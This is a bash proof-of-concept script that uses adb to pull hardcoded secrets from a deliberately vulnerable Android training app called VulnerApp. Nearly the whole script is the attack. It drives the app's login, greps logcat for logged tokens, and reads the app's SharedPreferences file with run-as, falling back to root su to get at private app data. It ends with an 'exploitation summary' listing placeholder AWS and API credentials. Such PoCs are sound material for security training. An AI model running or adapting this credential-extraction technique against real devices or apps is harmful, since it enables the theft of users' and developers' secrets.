#!/bin/bash

# PoC for Hardcoded Secrets Extraction from VulnerApp
# This script demonstrates how hardcoded secrets can be extracted from Android logs and SharedPreferences

echo "=== VulnerApp Hardcoded Secrets Extraction PoC ==="
echo "Target: com.dlh.vulnerapp"
echo

# Check if device is connected
if ! adb devices | grep -q "device$"; then
    echo "âŒ No Android device connected. Please connect a device or start an emulator."
    exit 1
fi

# Install the app if not already installed
echo "ðŸ“± Checking if VulnerApp is installed..."
if ! adb shell pm list packages | grep -q "com.dlh.vulnerapp"; then
    echo "âŒ VulnerApp not found. Please install VulnerAppDLH.apk first."
    echo "Run: adb install VulnerAppDLH.apk"
    exit 1
fi

# Clear previous logs
adb logcat -c

echo "ðŸ” Starting logcat monitoring for hardcoded secrets..."
adb logcat -v time | grep -E "(SecretsActivity|API Token)" &
LOGCAT_PID=$!

# Launch SecretsActivity to trigger secret logging
echo "ðŸš€ Launching SecretsActivity..."
adb shell am start -n com.dlh.vulnerapp/.SecretsActivity

# Wait for activity to load
sleep 2

# Trigger the login functionality to expose more secrets
echo "ðŸ“ Triggering login to expose AWS secrets in SharedPreferences..."
adb shell input text "testuser"
adb shell input keyevent 61  # Tab to password field
adb shell input text "testpass"
adb shell input tap 500 800  # Approximate login button tap

# Wait for processing
sleep 3

# Extract SharedPreferences containing hardcoded secrets
echo "ðŸ’¾ Extracting SharedPreferences with exposed secrets..."
adb shell "run-as com.dlh.vulnerapp cat shared_prefs/UserPrefs.xml" 2>/dev/null || {
    echo "ðŸ“± Attempting to read SharedPreferences as root..."
    adb shell "su -c 'cat /data/data/com.dlh.vulnerapp/shared_prefs/UserPrefs.xml'" 2>/dev/null || {
        echo "âš ï¸  Unable to read SharedPreferences directly. Secrets still exposed in logs."
    }
}

# Stop logcat monitoring
kill $LOGCAT_PID 2>/dev/null

echo
echo "ðŸŽ¯ EXPLOITATION SUMMARY:"
echo "âœ“ Hardcoded AWS Access Key: AKIAIOSFODNN7EXAMPLE"
echo "âœ“ Hardcoded API Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.Et9HF98yRYq"
echo "âœ“ AWS Secret Key exposed in Toast message"
echo "âœ“ Credentials stored unencrypted in SharedPreferences"
echo
echo "ðŸ”¥ IMPACT: Complete credential compromise via static analysis or runtime extraction"
echo "ðŸ’¡ Run 'adb logcat | grep -E \"API Token|Secret Key\"' to see logged secrets"
